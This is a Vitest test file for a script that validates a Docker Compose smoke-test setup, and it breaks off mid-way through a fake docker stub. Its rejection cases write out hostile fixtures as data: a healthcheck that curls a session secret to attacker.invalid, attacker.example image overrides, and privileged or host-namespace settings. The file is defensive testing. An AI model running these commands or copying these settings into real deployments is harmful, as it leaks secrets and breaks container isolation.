import { spawnSync } from "node:child_process";
import {
  chmodSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  readdirSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { describe, expect, it } from "vitest";

import {
  healthUrlFromComposePort,
  validateComposeSmokeConfig,
} from "../../../scripts/validate-compose-smoke.mjs";

describe("Compose smoke configuration", () => {
  it("accepts dynamic loopback publishing and least-privilege read-only mounts", () => {
    expect(() => validateComposeSmokeConfig(validConfig(), expectedSources)).not.toThrow();
  });

  it("mirrors the actual rendered Compose service identity and lifecycle contract", () => {
    const fixture = validConfig();
    const rendered = renderRepositoryComposeConfig();

    for (const serviceName of ["postgres", "web", "worker"] as const) {
      expect(serviceIdentity(fixture.services[serviceName])).toStrictEqual(
        serviceIdentity(rendered.services[serviceName]),
      );
    }
  });

  it("rejects the obsolete caller-supplied repository-root argument", () => {
    const config = validConfig();
    config.services.web.build!.context = "/";
    config.services.worker.build!.context = "/";

    const result = spawnSync(
      process.execPath,
      [
        resolve("scripts/validate-compose-smoke.mjs"),
        "--config-sources",
        "/",
        expectedSources.privateKey,
        expectedSources.webhookSecret,
        expectedSources.adminPassword,
        expectedSources.sessionSecret,
      ],
      { encoding: "utf8", input: JSON.stringify(config) },
    );

    expect(result.status).not.toBe(0);
    expect(result.stderr).toContain("Compose smoke validation requires generated mount sources");
  });

  it.each(["/", "/tmp"])("does not let the CLI bless build context %s", (buildContext) => {
    const config = validConfig();
    config.services.web.build!.context = buildContext;
    config.services.worker.build!.context = buildContext;

    const result = runValidatorCli(config);

    expect(result.status).not.toBe(0);
    expect(result.stderr).toContain("unsafe Compose smoke configuration");
  });

  it("resolves a symlinked validator invocation to the physical checkout", () => {
    const temporaryDirectory = mkdtempSync(join(tmpdir(), "triagepilot-validator-link-"));
    const validatorLink = join(temporaryDirectory, "validate-compose-smoke.mjs");
    symlinkSync(resolve("scripts/validate-compose-smoke.mjs"), validatorLink);
    try {
      const accepted = runValidatorCli(validConfig(), validatorLink, ["--preserve-symlinks-main"]);
      expect(accepted.status, accepted.stderr).toBe(0);

      const redirected = validConfig();
      redirected.services.web.build!.context = temporaryDirectory;
      redirected.services.worker.build!.context = temporaryDirectory;
      const rejected = runValidatorCli(redirected, validatorLink, ["--preserve-symlinks-main"]);
      expect(rejected.status).not.toBe(0);
      expect(rejected.stderr).toContain("unsafe Compose smoke configuration");
    } finally {
      rmSync(temporaryDirectory, { recursive: true, force: true });
    }
  });

  it.each([
    ["PostgreSQL build override", (config: SmokeConfig) => {
      config.services.postgres.build = { context: repositoryRoot, dockerfile: "Dockerfile" };
    }],
    ["PostgreSQL image override", (config: SmokeConfig) => {
      config.services.postgres.image = "attacker.example/postgres:latest";
    }],
    ["PostgreSQL pull policy override", (config: SmokeConfig) => {
      config.services.postgres.pull_policy = "always";
    }],
    ["PostgreSQL command override", (config: SmokeConfig) => {
      config.services.postgres.command = ["postgres", "-c", "shared_preload_libraries=attacker"];
    }],
    ["PostgreSQL entrypoint override", (config: SmokeConfig) => {
      config.services.postgres.entrypoint = ["/tmp/attacker-entrypoint"];
    }],
    ["privileged web post-start hook", (config: SmokeConfig) => {
      config.services.web.post_start = [{
        command: ["sh", "-c", "cat /run/secrets/triagepilot/session-secret"],
        privileged: true,
      }];
    }],
    ["worker pre-stop hook", (config: SmokeConfig) => {
      config.services.worker.pre_stop = [{ command: ["sh", "-c", "touch /tmp/pre-stop"] }];
    }],
    ["web develop watch hook", (config: SmokeConfig) => {
      config.services.web.develop = {
        watch: [{ action: "rebuild", path: "/tmp/attacker-context" }],
      };
    }],
    ["root build context", (config: SmokeConfig) => {
      config.services.web.build!.context = "/";
    }],
    ["outside build context", (config: SmokeConfig) => {
      config.services.web.build!.context = "/tmp/outside-repository";
    }],
    ["symlink build context", (config: SmokeConfig) => {
      config.services.web.build!.context = "/tmp/triagepilot-repository-link";
    }],
    ["alternate Dockerfile", (config: SmokeConfig) => {
      config.services.web.build!.dockerfile = "Dockerfile.attacker";
    }],
    ["build host network", (config: SmokeConfig) => {
      config.services.web.build!.network = "host";
    }],
    ["privileged build", (config: SmokeConfig) => {
      config.services.web.build!.privileged = true;
    }],
    ["build network.host entitlement", (config: SmokeConfig) => {
      config.services.web.build!.entitlements = ["network.host"];
    }],
    ["build security.insecure entitlement", (config: SmokeConfig) => {
      config.services.web.build!.entitlements = ["security.insecure"];
    }],
    ["build SSH forwarding", (config: SmokeConfig) => {
      config.services.web.build!.ssh = ["default"];
    }],
    ["build secret", (config: SmokeConfig) => {
      config.services.web.build!.secrets = [{ source: "ambient", target: "ambient" }];
    }],
    ["additional build context", (config: SmokeConfig) => {
      config.services.web.build!.additional_contexts = { ambient: "/tmp/ambient" };
    }],
    ["build host alias", (config: SmokeConfig) => {
      config.services.web.build!.extra_hosts = ["host.docker.internal=host-gateway"];
    }],
    ["build cache source", (config: SmokeConfig) => {
      config.services.web.build!.cache_from = [{ type: "local", src: "/tmp/cache" }];
    }],
    ["build cache destination", (config: SmokeConfig) => {
      config.services.web.build!.cache_to = [{ type: "local", dest: "/tmp/cache" }];
    }],
    ["build output", (config: SmokeConfig) => {
      config.services.web.build!.outputs = [{ type: "local", dest: "/tmp/output" }];
    }],
    ["build tag", (config: SmokeConfig) => {
      config.services.web.build!.tags = ["attacker.example/triagepilot:latest"];
    }],
    ["build target", (config: SmokeConfig) => {
      config.services.web.build!.target = "build";
    }],
    ["build argument", (config: SmokeConfig) => {
      config.services.web.build!.args = { ATTACKER: "true" };
    }],
    ["web image override", (config: SmokeConfig) => {
      config.services.web.image = "attacker.example/triagepilot:latest";
    }],
    ["worker image override", (config: SmokeConfig) => {
      config.services.worker.image = "attacker.example/triagepilot:latest";
    }],
    ["web pull policy override", (config: SmokeConfig) => {
      config.services.web.pull_policy = "always";
    }],
    ["worker command override", (config: SmokeConfig) => {
      config.services.worker.command = ["pnpm", "--filter", "@triagepilot/web", "start"];
    }],
    ["web entrypoint override", (config: SmokeConfig) => {
      config.services.web.entrypoint = ["/tmp/attacker-entrypoint"];
    }],
    ["secret-exfiltrating web healthcheck", (config: SmokeConfig) => {
      config.services.web.healthcheck!.test = [
        "CMD-SHELL",
        "curl --data-binary @/run/secrets/triagepilot/session-secret https://attacker.invalid",
      ];
    }],
    ["web healthcheck interval mutation", (config: SmokeConfig) => {
      config.services.web.healthcheck!.interval = "1s";
    }],
    ["web healthcheck timeout mutation", (config: SmokeConfig) => {
      config.services.web.healthcheck!.timeout = "30s";
    }],
    ["web healthcheck retries mutation", (config: SmokeConfig) => {
      config.services.web.healthcheck!.retries = 50;
    }],
    ["web healthcheck start period", (config: SmokeConfig) => {
      config.services.web.healthcheck!.start_period = "1s";
    }],
    ["web healthcheck disable flag", (config: SmokeConfig) => {
      config.services.web.healthcheck!.disable = true;
    }],
    ["web healthcheck extra key", (config: SmokeConfig) => {
      config.services.web.healthcheck!.start_interval = "1s";
    }],
    ["missing web healthcheck", (config: SmokeConfig) => {
      delete config.services.web.healthcheck;
    }],
    ["PostgreSQL healthcheck command mutation", (config: SmokeConfig) => {
      config.services.postgres.healthcheck!.test = ["CMD-SHELL", "curl https://attacker.invalid"];
    }],
    ["PostgreSQL healthcheck interval mutation", (config: SmokeConfig) => {
      config.services.postgres.healthcheck!.interval = "1s";
    }],
    ["PostgreSQL healthcheck timeout mutation", (config: SmokeConfig) => {
      config.services.postgres.healthcheck!.timeout = "30s";
    }],
    ["PostgreSQL healthcheck retries mutation", (config: SmokeConfig) => {
      config.services.postgres.healthcheck!.retries = 50;
    }],
    ["PostgreSQL healthcheck disable flag", (config: SmokeConfig) => {
      config.services.postgres.healthcheck!.disable = true;
    }],
    ["PostgreSQL healthcheck start period", (config: SmokeConfig) => {
      config.services.postgres.healthcheck!.start_period = "1s";
    }],
    ["PostgreSQL healthcheck extra key", (config: SmokeConfig) => {
      config.services.postgres.healthcheck!.start_interval = "1s";
    }],
    ["missing PostgreSQL healthcheck", (config: SmokeConfig) => {
      delete config.services.postgres.healthcheck;
    }],
    ["worker healthcheck", (config: SmokeConfig) => {
      config.services.worker.healthcheck = {
        test: ["CMD-SHELL", "curl https://attacker.invalid"],
        interval: "10s",
        timeout: "5s",
        retries: 5,
      };
    }],
    ["alternate container runtime", (config: SmokeConfig) => {
      config.services.worker.runtime = "runsc";
    }],
    ["alternate container isolation", (config: SmokeConfig) => {
      config.services.worker.isolation = "hyperv";
    }],
    ["webhook environment", (config: SmokeConfig) => {
      config.services.worker.environment.GITHUB_WEBHOOK_SECRET_FILE = "/run/secrets/triagepilot/webhook-secret";
    }],
    ["webhook mount", (config: SmokeConfig) => {
      config.services.worker.volumes.push(readOnlyMount("/tmp/webhook", "/run/secrets/triagepilot/webhook-secret"));
    }],
    ["writable private-key mount", (config: SmokeConfig) => {
      config.services.worker.volumes[0]!.read_only = false;
    }],
    ["fixed public port", (config: SmokeConfig) => {
      config.services.web.ports[0]!.published = "8787";
    }],
    ["non-loopback bind", (config: SmokeConfig) => {
      config.services.web.ports[0]!.host_ip = "0.0.0.0";
    }],
    ["additional public port", (config: SmokeConfig) => {
      config.services.web.ports.push({
        target: 8787,
        published: "8787",
        host_ip: "0.0.0.0",
        protocol: "tcp",
        mode: "ingress",
      });
    }],
    ["additional dynamic loopback port", (config: SmokeConfig) => {
      config.services.web.ports.push({
        target: 8787,
        published: "0",
        host_ip: "127.0.0.1",
        protocol: "tcp",
        mode: "ingress",
      });
    }],
    ["published worker port", (config: SmokeConfig) => {
      config.services.worker.ports.push({
        target: 8787,
        published: "0",
        host_ip: "127.0.0.1",
        protocol: "tcp",
        mode: "ingress",
      });
    }],
    ["published PostgreSQL port", (config: SmokeConfig) => {
      config.services.postgres.ports.push({
        target: 5432,
        published: "5432",
        host_ip: "0.0.0.0",
        protocol: "tcp",
        mode: "ingress",
      });
    }],
    ["UDP-only web port", (config: SmokeConfig) => {
      config.services.web.ports[0]!.protocol = "udp";
    }],
    ["additive UDP web port", (config: SmokeConfig) => {
      config.services.web.ports.push({
        target: 8787,
        published: "0",
        host_ip: "127.0.0.1",
        protocol: "udp",
        mode: "ingress",
      });
    }],
    ["host-mode web port", (config: SmokeConfig) => {
      config.services.web.ports[0]!.mode = "host";
    }],
    ["unexpected service", (config: SmokeConfig) => {
      config.services.sidecar = emptyService();
    }],
    ["missing PostgreSQL service", (config: SmokeConfig) => {
      delete (config.services as Record<string, SmokeService>).postgres;
    }],
    ["additional web mount", (config: SmokeConfig) => {
      config.services.web.volumes.push(readOnlyMount("/tmp/extra", "/run/secrets/triagepilot/extra"));
    }],
    ["additional worker mount", (config: SmokeConfig) => {
      config.services.worker.volumes.push(readOnlyMount("/tmp/extra", "/run/secrets/triagepilot/extra"));
    }],
    ["additional PostgreSQL mount", (config: SmokeConfig) => {
      config.services.postgres.volumes.push(readOnlyMount("/tmp/extra", "/var/lib/postgresql/extra"));
    }],
    ["missing web mount", (config: SmokeConfig) => {
      config.services.web.volumes.pop();
    }],
    ["missing PostgreSQL data volume", (config: SmokeConfig) => {
      config.services.postgres.volumes.pop();
    }],
    ["worker service secret", (config: SmokeConfig) => {
      config.services.worker.secrets = [{ source: "injected", target: "/run/secrets/injected" }];
    }],
    ["web service config", (config: SmokeConfig) => {
      config.services.web.configs = [{ source: "injected", target: "/run/config/injected" }];
    }],
    ["top-level secret", (config: SmokeConfig) => {
      config.secrets = { injected: { file: "/tmp/injected" } };
    }],
    ["top-level config", (config: SmokeConfig) => {
      config.configs = { injected: { file: "/tmp/injected" } };
    }],
    ["webhook source disguised at another worker target", (config: SmokeConfig) => {
      config.services.worker.volumes.push(
        readOnlyMount(expectedSources.webhookSecret, "/run/secrets/triagepilot/not-a-webhook-secret"),
      );
    }],
    ["wrong private-key source", (config: SmokeConfig) => {
      config.services.web.volumes[0]!.source = "/tmp/ambient-private-key.pem";
    }],
    ["external web database", (config: SmokeConfig) => {
      config.services.web.environment.DATABASE_URL = "postgres://ambient.example/sentinel";
    }],
    ["external worker database", (config: SmokeConfig) => {
      config.services.worker.environment.DATABASE_URL = "postgres://ambient.example/sentinel";
    }],
    ["direct admin password", (config: SmokeConfig) => {
      config.services.web.environment.ADMIN_PASSWORD = "ambient-admin-secret";
    }],
    ["direct session secret", (config: SmokeConfig) => {
      config.services.web.environment.SESSION_SECRET = "ambient-session-secret";
    }],
    ["direct GitHub private key", (config: SmokeConfig) => {
      config.services.web.environment.GITHUB_PRIVATE_KEY = "ambient-private-key";
    }],
    ["direct GitHub webhook secret", (config: SmokeConfig) => {
      config.services.web.environment.GITHUB_WEBHOOK_SECRET = "ambient-webhook-secret";
    }],
    ["wrong admin password file", (config: SmokeConfig) => {
      config.services.web.environment.ADMIN_PASSWORD_FILE = "/tmp/ambient-admin-password";
    }],
    ["wrong session secret file", (config: SmokeConfig) => {
      config.services.web.environment.SESSION_SECRET_FILE = "/tmp/ambient-session-secret";
    }],
    ["wrong web private-key file", (config: SmokeConfig) => {
      config.services.web.environment.GITHUB_PRIVATE_KEY_FILE = "/tmp/ambient-private-key.pem";
    }],
    ["wrong webhook-secret file", (config: SmokeConfig) => {
      config.services.web.environment.GITHUB_WEBHOOK_SECRET_FILE = "/tmp/ambient-webhook-secret";
    }],
    ["wrong worker private-key file", (config: SmokeConfig) => {
      config.services.worker.environment.GITHUB_PRIVATE_KEY_FILE = "/tmp/ambient-private-key.pem";
    }],
    ["direct worker private key", (config: SmokeConfig) => {
      config.services.worker.environment.GITHUB_PRIVATE_KEY = "ambient-private-key";
    }],
    ["worker environment alias to webhook secret", (config: SmokeConfig) => {
      config.services.worker.environment.INNOCENT_ALIAS = "/run/secrets/triagepilot/webhook-secret";
    }],
    ["web environment alias to generated secret", (config: SmokeConfig) => {
      config.services.web.environment.INNOCENT_ALIAS = "/run/secrets/triagepilot/session-secret";
    }],
    ["unexpected PostgreSQL environment", (config: SmokeConfig) => {
      config.services.postgres.environment.INNOCENT_ALIAS = "unexpected";
    }],
    ["PostgreSQL host network mode", (config: SmokeConfig) => {
      config.services.postgres.network_mode = "host";
    }],
    ["host PID namespace", (config: SmokeConfig) => {
      config.services.web.pid = "host";
    }],
    ["host IPC namespace", (config: SmokeConfig) => {
      config.services.web.ipc = "host";
    }],
    ["host UTS namespace", (config: SmokeConfig) => {
      config.services.web.uts = "host";
    }],
    ["host user namespace", (config: SmokeConfig) => {
      config.services.worker.userns_mode = "host";
    }],
    ["privileged worker", (config: SmokeConfig) => {
      config.services.worker.privileged = true;
    }],
    ["added Linux capability", (config: SmokeConfig) => {
      config.services.worker.cap_add = ["SYS_ADMIN"];
    }],
    ["host device", (config: SmokeConfig) => {
      config.services.worker.devices = [{ source: "/dev/kvm", target: "/dev/kvm" }];
    }],
    ["device cgroup rule", (config: SmokeConfig) => {
      config.services.worker.device_cgroup_rules = ["c 1:3 rwm"];
    }],
    ["external service link", (config: SmokeConfig) => {
      config.services.worker.external_links = ["outside:outside"];
    }],
    ["legacy service link", (config: SmokeConfig) => {
      config.services.worker.links = ["postgres:database"];
    }],
    ["host alias", (config: SmokeConfig) => {
      config.services.worker.extra_hosts = ["host.docker.internal:host-gateway"];
    }],
    ["unconfined security option", (config: SmokeConfig) => {
      config.services.worker.security_opt = ["apparmor=unconfined"];
    }],
    ["inherited service volumes", (config: SmokeConfig) => {
      config.services.worker.volumes_from = ["outside"];
    }],
    ["GPU host device request", (config: SmokeConfig) => {
      config.services.worker.gpus = "all";
    }],
    ["Docker API socket injection", (config: SmokeConfig) => {
      config.services.worker.use_api_socket = true;
    }],
    ["extra service network attachment", (config: SmokeConfig) => {
      config.services.web.networks.bypass = null;
    }],
    ["unexpected top-level network", (config: SmokeConfig) => {
      config.networks.bypass = { name: "outside", external: true };
    }],
    ["external default network", (config: SmokeConfig) => {
      config.networks.default = { name: "outside", external: true };
    }],
    ["mismatched project network name", (config: SmokeConfig) => {
      config.networks.default.name = "another-project_default";
    }],
    ["external existing PostgreSQL volume", (config: SmokeConfig) => {
      config.volumes["postgres-data"] = { name: "existing-postgres-data", external: true };
    }],
    ["unexpected top-level volume", (config: SmokeConfig) => {
      config.volumes.backup = { name: `${config.name}_backup` };
    }],
    ["non-local PostgreSQL volume", (config: SmokeConfig) => {
      config.volumes["postgres-data"].driver = "nfs";
    }],
    ["PostgreSQL bind-driver alias", (config: SmokeConfig) => {
      config.volumes["postgres-data"].driver = "local";
      config.volumes["postgres-data"].driver_opts = {
        type: "none",
        o: "bind",
        device: "/tmp/ambient-postgres",
      };
    }],
  ])("rejects unsafe %s", (_case, mutate) => {
    const config = validConfig();
    mutate(config);

    expect(() => validateComposeSmokeConfig(config, expectedSources)).toThrow(
      "unsafe Compose smoke configuration",
    );
  });

  it("sanitizes hostile ambient Compose interpolation values", () => {
    const fixture = createFakeSmokeToolchain();
    try {
      const hostileSecrets = [
        "postgres://ambient.example/sentinel",
        "ambient-admin-secret",
        "ambient-session-secret",
        "ambient-private-key",
        "ambient-webhook-secret",
      ];
      const result = spawnSync("bash", [resolve("scripts/compose-smoke.sh")], {
        cwd: resolve("."),
        encoding: "utf8",
        env: {
          ...process.env,
          PATH: `${fixture.binDirectory}:${process.env.PATH ?? ""}`,
          HOME: fixture.temporaryParent,
          TMPDIR: fixture.temporaryParent,
          DATABASE_URL: hostileSecrets[0],
          ADMIN_PASSWORD: hostileSecrets[1],
          SESSION_SECRET: hostileSecrets[2],
          GITHUB_PRIVATE_KEY: hostileSecrets[3],
          GITHUB_WEBHOOK_SECRET: hostileSecrets[4],
          GITHUB_PRIVATE_KEY_FILE: "/tmp/ambient-private-key.pem",
          GITHUB_WEBHOOK_SECRET_FILE: "/tmp/ambient-webhook-secret",
          TRIAGEPILOT_WEB_BIND: "0.0.0.0",
          TRIAGEPILOT_WEB_PORT: "8787",
          COMPOSE_FILE: "/tmp/ambient-compose.yml",
          COMPOSE_ENV_FILES: "/tmp/ambient.env",
          COMPOSE_PROFILES: "ambient-profile",
          COMPOSE_PROJECT_NAME: "ambient-project",
          COMPOSE_DISABLE_ENV_FILE: "false",
          COMPOSE_PATH_SEPARATOR: "!",
          COMPOSE_BAKE: "true",
          DOCKER_HOST: "tcp://docker.example:2376",
          DOCKER_CONTEXT: "secure-context",
          DOCKER_CONFIG: "/client/docker-config",
          DOCKER_CERT_PATH: "/client/docker-certs",
          DOCKER_TLS: "1",
          DOCKER_TLS_VERIFY: "1",
          HTTP_PROXY: "http://uppercase-proxy.invalid:8080",
          HTTPS_PROXY: "https://uppercase-proxy.invalid:8443",
          NO_PROXY: "docker.example,127.0.0.1",
          http_proxy: "http://lowercase-proxy.invalid:8081",
          https_proxy: "https://lowercase-proxy.invalid:8444",
          no_proxy: "localhost,.internal",
          SSH_AUTH_SOCK: "/client/ssh-agent.sock",
          SSL_CERT_FILE: "/client/certificates/ca.pem",
          SSL_CERT_DIR: "/client/certificates",
        },
      });

      expect(result.status, result.stderr).toBe(0);
      const commandLog = readFileSync(fixture.logFile, "utf8");
      const processOutput = `${result.stdout}${result.stderr}`;
      expect(commandLog).toContain("config --format json");
      expect(commandLog).toContain("down --volumes --remove-orphans");
      for (const command of commandLog.trim().split("\n")) {
        expect(command).toMatch(
          /^compose --project-name triagepilot-smoke-[0-9a-f]{16} -f \/.+\/docker-compose\.yml -f \/.+\/compose\.override\.yml --env-file \/.+\/environment /,
        );
      }
      for (const secret of hostileSecrets) {
        expect(processOutput).not.toContain(secret);
      }
      expect(readdirSync(fixture.temporaryParent).sort()).toEqual(["bin", "smoke.log"]);
    } finally {
      rmSync(fixture.root, { recursive: true, force: true });
    }
  });

  it("installs cleanup before OpenSSL can fail", () => {
    const fixture = createFakeSmokeToolchain({ failOpenSsl: true });
    try {
      const result = spawnSync("bash", [resolve("scripts/compose-smoke.sh")], {
        cwd: resolve("."),
        encoding: "utf8",
        env: {
          ...process.env,
          PATH: `${fixture.binDirectory}:${process.env.PATH ?? ""}`,
          HOME: fixture.temporaryParent,
          TMPDIR: fixture.temporaryParent,
        },
      });

      expect(result.status).not.toBe(0);
      expect(readdirSync(fixture.temporaryParent).sort()).toEqual(["bin"]);
    } finally {
      rmSync(fixture.root, { recursive: true, force: true });
    }
  });

  it("turns the Docker-assigned loopback port into the health URL", () => {
    expect(healthUrlFromComposePort("127.0.0.1:49153\n")).toBe("http://127.0.0.1:49153/health");
    expect(() => healthUrlFromComposePort("0.0.0.0:8787")).toThrow("invalid Compose health port");
    expect(() => healthUrlFromComposePort("127.0.0.1:0")).toThrow("invalid Compose health port");
  });
});

interface SmokeConfig {
  name: string;
  services: Record<string, SmokeService> & {
    postgres: SmokeService;
    web: SmokeService;
    worker: SmokeService;
  };
  networks: Record<string, Record<string, unknown>> & {
    default: Record<string, unknown> & { name: string };
  };
  volumes: Record<string, Record<string, unknown>> & {
    "postgres-data": Record<string, unknown> & { name: string };
  };
  secrets?: unknown;
  configs?: unknown;
}

interface SmokeService {
  build?: Record<string, unknown>;
  image?: string;
  pull_policy?: string;
  command?: string | string[] | null;
  entrypoint?: string | string[] | null;
  healthcheck?: {
    test: string[];
    interval: string;
    timeout: string;
    retries: number;
    [key: string]: unknown;
  };
  environment: Record<string, string>;
  volumes: Array<{
    type: string;
    source: string;
    target: string;
    read_only: boolean;
    volume?: Record<string, unknown>;
  }>;
  ports: Array<{
    target: number;
    published: string;
    host_ip: string;
    protocol: string;
    mode: string;
  }>;
  networks: Record<string, null | Record<string, unknown>>;
  secrets?: unknown;
  configs?: unknown;
  [key: string]: unknown;
}

const expectedSources = {
  privateKey: "/tmp/private-key.pem",
  webhookSecret: "/tmp/webhook-secret",
  adminPassword: "/tmp/admin-password",
  sessionSecret: "/tmp/session-secret",
};

const repositoryRoot = realpathSync(resolve("."));

const internalDatabaseUrl = "postgres://triagepilot:triagepilot@postgres:5432/triagepilot";

function validConfig(): SmokeConfig {
  const name = "triagepilot-smoke-0123456789abcdef";
  return {
    name,
    networks: {
      default: { name: `${name}_default`, ipam: {} },
    },
    volumes: {
      "postgres-data": { name: `${name}_postgres-data` },
    },
    services: {
      postgres: {
        image: "postgres:16",
        command: null,
        entrypoint: null,
        healthcheck: {
          test: ["CMD-SHELL", "pg_isready -U triagepilot -d triagepilot"],
          timeout: "5s",
          interval: "10s",
          retries: 5,
        },
        environment: {
          POSTGRES_USER: "triagepilot",
          POSTGRES_PASSWORD: "triagepilot",
          POSTGRES_DB: "triagepilot",
        },
        volumes: [writableVolume("postgres-data", "/var/lib/postgresql/data")],
        ports: [],
        networks: { default: null },
      },
      web: {
        build: {
          context: repositoryRoot,
          dockerfile: "Dockerfile",
        },
        command: ["pnpm", "--filter", "@triagepilot/web", "start"],
        entrypoint: null,
        healthcheck: {
          test: [
            "CMD",
            "node",
            "-e",
            "fetch('http://localhost:8787/health').then(r=>process.exit(r.ok?0:1)).catch(()=>process.exit(1))",
          ],
          timeout: "5s",
          interval: "10s",
          retries: 5,
        },
        environment: {
          NODE_ENV: "production",
          APP_BASE_URL: "http://127.0.0.1:8787",
          DATABASE_URL: internalDatabaseUrl,
          ADMIN_USERNAME: "smoke-admin",
          ADMIN_PASSWORD: "",
          ADMIN_PASSWORD_FILE: "/run/secrets/triagepilot/admin-password",
          SESSION_SECRET: "",
          SESSION_SECRET_FILE: "/run/secrets/triagepilot/session-secret",
          GITHUB_PRIVATE_KEY: "",
          GITHUB_PRIVATE_KEY_FILE: "/run/secrets/triagepilot/private-key.pem",
          GITHUB_WEBHOOK_SECRET: "",
          GITHUB_WEBHOOK_SECRET_FILE: "/run/secrets/triagepilot/webhook-secret",
          GITHUB_ORGANIZATION: "smoke-organization",
          GITHUB_APP_ID: "12345",
        },
        volumes: [
          readOnlyMount("/tmp/private-key.pem", "/run/secrets/triagepilot/private-key.pem"),
          readOnlyMount("/tmp/webhook-secret", "/run/secrets/triagepilot/webhook-secret"),
          readOnlyMount("/tmp/admin-password", "/run/secrets/triagepilot/admin-password"),
          readOnlyMount("/tmp/session-secret", "/run/secrets/triagepilot/session-secret"),
        ],
        ports: [{
          target: 8787,
          published: "0",
          host_ip: "127.0.0.1",
          protocol: "tcp",
          mode: "ingress",
        }],
        networks: { default: null },
      },
      worker: {
        build: {
          context: repositoryRoot,
          dockerfile: "Dockerfile",
        },
        command: ["pnpm", "--filter", "@triagepilot/worker", "start"],
        entrypoint: null,
        environment: {
          NODE_ENV: "production",
          DATABASE_URL: internalDatabaseUrl,
          GITHUB_ORGANIZATION: "smoke-organization",
          GITHUB_APP_ID: "12345",
          GITHUB_PRIVATE_KEY: "",
          GITHUB_PRIVATE_KEY_FILE: "/run/secrets/triagepilot/private-key.pem",
          WORKER_POLL_MS: "250",
          WORKER_ID: "smoke-worker",
        },
        volumes: [readOnlyMount("/tmp/private-key.pem", "/run/secrets/triagepilot/private-key.pem")],
        ports: [],
        networks: { default: null },
      },
    },
  };
}

function readOnlyMount(source: string, target: string) {
  return { type: "bind", source, target, read_only: true };
}

function writableVolume(source: string, target: string) {
  return { type: "volume", source, target, read_only: false, volume: {} };
}

function emptyService(): SmokeService {
  return { environment: {}, volumes: [], ports: [], networks: { default: null } };
}

function serviceIdentity(service: SmokeService) {
  const identityFields = [
    "build",
    "image",
    "pull_policy",
    "entrypoint",
    "command",
    "healthcheck",
    "post_start",
    "pre_stop",
    "develop",
  ];
  return Object.fromEntries(
    identityFields
      .filter((field) => Object.hasOwn(service, field))
      .map((field) => [field, service[field]]),
  );
}

function runValidatorCli(
  config: SmokeConfig,
  validator = resolve("scripts/validate-compose-smoke.mjs"),
  nodeArguments: string[] = [],
) {
  return spawnSync(
    process.execPath,
    [
      ...nodeArguments,
      validator,
      "--config-sources",
      expectedSources.privateKey,
      expectedSources.webhookSecret,
      expectedSources.adminPassword,
      expectedSources.sessionSecret,
    ],
    { encoding: "utf8", input: JSON.stringify(config) },
  );
}

function renderRepositoryComposeConfig(): SmokeConfig {
  const environment = Object.fromEntries(
    Object.entries(process.env).filter(([name]) => !name.startsWith("COMPOSE_")),
  );
  const result = spawnSync(
    "docker",
    [
      "compose",
      "--project-name",
      "triagepilot-smoke-0123456789abcdef",
      "-f",
      resolve("docker-compose.yml"),
      "config",
      "--format",
      "json",
    ],
    {
      cwd: resolve("."),
      encoding: "utf8",
      env: environment,
    },
  );

  expect(result.status, result.stderr).toBe(0);
  return JSON.parse(result.stdout) as SmokeConfig;
}

function createFakeSmokeToolchain(options: { failOpenSsl?: boolean } = {}) {
  const root = mkdtempSync(join(tmpdir(), "triagepilot-compose-smoke-test-"));
  const temporaryParent = join(root, "tmp");
  const binDirectory = join(temporaryParent, "bin");
  mkdirSync(binDirectory, { recursive: true });
  const logFile = join(temporaryParent, "smoke.log");

  writeExecutable(
    join(binDirectory, "curl"),
    `#!/usr/bin/env bash
exit 0
`,
  );
  if (options.failOpenSsl) {
    writeExecutable(
      join(binDirectory, "openssl"),
      `#!/usr/bin/env bash
exit 42
`,
    );
  }
  writeExecutable(
    join(binDirectory, "docker"),
    `#!/usr/bin/env bash
set -Eeuo pipefail
for name in NODE_ENV APP_BASE_URL DATABASE_URL ADMIN_USERNAME ADMIN_PASSWORD ADMIN_PASSWORD_FILE SESSION_SECRET SESSION_SECRET_FILE GITHUB_ORGANIZATION GITHUB_APP_ID GITHUB_PRIVATE_KEY GITHUB_PRIVATE_KEY_FILE GITHUB_WEBHOOK_SECRET GITHUB_WEBHOOK_SECRET_FILE TRIAGEPILOT_WEB_BIND TRIAGEPILOT_WEB_PORT WORKER_POLL_MS WORKER_ID SMOKE_PRIVATE_KEY_HOST_PATH SMOKE_WEBHOOK_SECRET_HOST_PATH SMOKE_ADMIN_PASSWORD_HOST_PATH SMOKE_SESSION_SECRET_HOST_PATH; do
  if [[ "\${!name+x}" == x ]]; then
    echo "ambient Compose variable reached Docker: $name" >&2
    exit 90
  fi
done
if env | grep -q '^COMPOSE_'; then
  echo "ambient Compose control reached Docker" >&2
  exit 91
fi
assert_preserved() {
  local name="$1"
  local expected="$2"
  if [[ "\${!name-}" != "$expected" ]]; then
    echo "Docker client variable changed: $name" >&2
    exit 92
  fi
}
assert_preserved DOCKER_HOST 'tcp://docker.example:2376'
assert_preserved DOCKER_CONTEXT 'secure-context'
assert_preserved DOCKER_CONFIG '/client/docker-config'
assert_preserved DOCKER_CERT_PATH '/client/docker-certs'
assert_preserved DOCKER_TLS '1'
assert_preserved DOCKER_TLS_VERIFY '1'
assert_preserved HTTP_PROXY 'http://uppercase-proxy.invalid:8080'
assert_preserved HTTPS_PROXY 'https://uppercase-proxy.invalid:8443'
assert_preserved NO_PROXY 'docker.example,127.0.0.1'
assert_preserved http_proxy 'http://lowercase-proxy.invalid:8081'
assert_preserved https_proxy 'https://lowercase-proxy.invalid:8444'
assert_preserved no_proxy 'localhost,.internal'
assert_preserved SSH_AUTH_SOCK '/client/ssh-agent.sock'
assert_preserved SSL_CERT_FILE '/client/certificates/ca.pem'
assert_preserved SSL_CERT_DIR '/client/certificates'
if [[ "\${1-}" != compose || "\${2-}" != --project-name || "\${3-}" != triagepilot-smoke-* ]]; then
  echo "Compose project is not explicit" >&2
  exit 93
fi
printf '%s\\n' "$*" >> "$HOME/smoke.log"
environment_file=""
compose_file_count=0
environment_file_count=0
for ((index = 1; index <= $#; index++)); do
  if [[ "\${!index}" == "--env-file" ]]; then
    environment_file_count=$((environment_file_count + 1))
    next=$((index + 1))
    environment_file="\${!next}"
  fi
  if [[ "\${!index}" == "-f" ]]; then
    compose_file_count=$((compose_file_count + 1))
  fi
done
if [[ "$compose_file_count" != 2 || "$environment_file_count" != 1 ]]; then
  echo "Compose files or environment file are not explicit" >&2
  exit 94
fi
if [[ "$*" == *"config --format json"* ]]; then
